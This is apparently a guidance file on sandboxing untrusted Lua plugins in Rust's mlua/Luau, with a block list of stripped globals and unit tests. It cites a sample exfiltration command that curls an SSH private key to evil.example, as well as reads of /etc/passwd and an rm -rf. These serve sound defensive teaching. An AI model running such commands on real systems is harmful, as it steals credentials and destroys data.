---
name: mlua-luau-sandbox
description: When embedding mlua/Luau as a plugin host, strip seven dangerous globals before any script runs and THEN engage lua.sandbox(true). One layer is not enough.
triggers:
  - mlua
  - luau
  - lua plugin
  - lua sandbox
  - mlua::Lua
  - lua.sandbox
  - lua plugin host
  - lua scripting embed
  - lua untrusted
  - third-party lua
---

# mlua / Luau two-layer sandbox

## The Insight

Embedding mlua as a plugin host for user-authored scripts looks like one line: `Lua::new()`, hand the user's source to `lua.load(...).exec()`, done. That gives the script the **full** Lua standard library — `io.open("/etc/passwd")`, `os.execute("rm -rf …")`, `package.loadlib(...)`, `debug.getinfo(...)` — i.e., full host privileges.

mlua's `feature = "luau"` switches the underlying VM to Roblox's Luau, which adds a `lua.sandbox(true)` call that makes the base environment read-only. **But `sandbox(true)` alone does not delete the dangerous globals** — it freezes them in place. A script can still call `os.execute` if `os` is in scope.

The correct pattern is **two layers**:
1. **Strip the dangerous globals first** — set `io`, `os`, `package`, `debug`, `dofile`, `loadfile`, `load` to `nil` on the globals table before the user's script runs. This deletes the entry points entirely; even if the script tries to `_G.os`, it sees nil.
2. **Then engage `lua.sandbox(true)`** — locks the rest of the base env as read-only so the script can't re-introduce them via `_G.os = require("os")` or similar.

Stripping first then sandboxing is "belt-and-suspenders." Either alone is exploitable.

## Why This Matters

If a host installs a third-party plugin from a Lua registry, the plugin runs with whatever capabilities the host's `Lua` instance exposes. A plugin that quietly runs `os.execute("curl evil.example/exfiltrate?key=$(cat ~/.ssh/id_rsa)")` is a full sandbox escape on the first run.

Detection is impossible after the fact — `os.execute` runs synchronously, returns to the script, and the script keeps running its visible behavior. There's no audit trail unless you wired one *before* exposing `os`.

The two-layer pattern is cheap (microseconds at host construction) and verifiable with unit tests that assert specific stdlib calls now error.

## Recognition Pattern

You're about to need this when:
- Adding `mlua` to a Rust crate's dependencies with `features = [..., "vendored", ...]` and intending to load scripts authored outside the host's source tree.
- Writing a `PluginHost::new()` / `ScriptEngine::new()` constructor that returns a Lua instance for callers to `.exec(user_source)`.
- The feature list includes `"luau"` (good — picks the safer dialect) and you're tempted to skip the strip pass because "Luau is already sandboxed."
- Reviewing an mlua-using crate and the codebase does NOT set `io`, `os`, etc. to nil before the first script runs.

## The Approach

```rust
pub struct PluginHost {
    lua: mlua::Lua,
}

const STRIPPED_GLOBALS: &[&str] = &[
    "io",        // file & process I/O — never expose to untrusted scripts
    "os",        // os.execute, os.remove, os.getenv, os.exit
    "package",   // package.loadlib lets scripts pull in arbitrary C
    "debug",     // debug.getinfo / debug.setlocal break encapsulation
    "dofile",    // arbitrary file load
    "loadfile",  // arbitrary file load
    "load",      // generic loader — lets a script wrap raw bytecode/source
    // intentionally NOT stripping: string, math, table, coroutine, utf8
];

impl PluginHost {
    pub fn new() -> Result<Self, PluginError> {
        let lua = mlua::Lua::new();

        // Layer 1: delete dangerous globals BEFORE the script can see them.
        let globals = lua.globals();
        for name in STRIPPED_GLOBALS {
            globals
                .set(*name, mlua::Value::Nil)
                .map_err(|e| PluginError::Sandbox(format!("strip {name}: {e}")))?;
        }

        // Layer 2: make the rest of the base env read-only. Without this, a script
        // could do `os = require_via_some_other_path()` if any backdoor remained.
        lua.sandbox(true)
            .map_err(|e| PluginError::Sandbox(format!("lua.sandbox(true): {e}")))?;

        Ok(Self { lua })
    }

    pub fn run(&self, script: &str) -> Result<String, PluginError> {
        // ... compile, exec, coerce return value
    }
}
```

**Operational rules:**
- **Fresh host per untrusted call.** A misbehaving script that pollutes the globals table within its allowed surface area shouldn't poison the next caller. For hot paths (button clicks, on-key handlers), pool *trusted* hosts by manifest-id; never share an untrusted-script host between callers.
- **Test the sandbox is real.** Unit tests must assert each stripped global is actually unreachable: a script that says `return os.execute("ls")` MUST return a `PluginError::Runtime` with a message about `attempt to index a nil value (global 'os')`, not a process exit code.
- **Don't enable mlua's `async` feature unless you actually need it.** Async pulls in tokio coupling and complicates the cooperative-cancellation story; sync `run()` keeps the spike simple.
- **Vendored Lua C build.** Always include `features = ["vendored"]` so the Luau VM ships from source and doesn't require a system Lua install — critical for cross-platform builds (workstation, Pi, mobile).

## Wave-4+ follow-ups worth knowing about

- **Cooperative cancellation.** `lua.set_interrupt(|_| { if elapsed > budget { mlua::VmState::Yield } else { mlua::VmState::Continue } })` caps script wall-clock so a `while true do end` can't pin a worker thread.
- **Table → JSON.** mlua's `serde` feature lets you round-trip return values through `serde_json::Value` so the host can pull structured output instead of `to_string()`-ing tables to `"<table>"`.
- **Curated host API.** Expose a deliberate `host` table (e.g., `host.read_section(...)`, `host.suggest(...)`) so plugins have a sanctioned surface area instead of "stripped stdlib + nothing useful." That's where signature-based capability scoping eventually lands.

## Example: smoke tests that the sandbox holds

```rust
#[test]
fn os_execute_unreachable() {
    let host = PluginHost::new().unwrap();
    let err = host.run(r#"return os.execute("ls")"#).unwrap_err();
    match err {
        PluginError::Runtime(msg) => assert!(msg.contains("nil value") && msg.contains("'os'")),
        other => panic!("expected Runtime nil-index error, got {other:?}"),
    }
}

#[test]
fn io_open_unreachable() {
    let host = PluginHost::new().unwrap();
    assert!(host.run(r#"return io.open("/etc/passwd")"#).is_err());
}

#[test]
fn package_loadlib_unreachable() {
    let host = PluginHost::new().unwrap();
    assert!(host.run(r#"return package.loadlib("foo", "bar")"#).is_err());
}
```
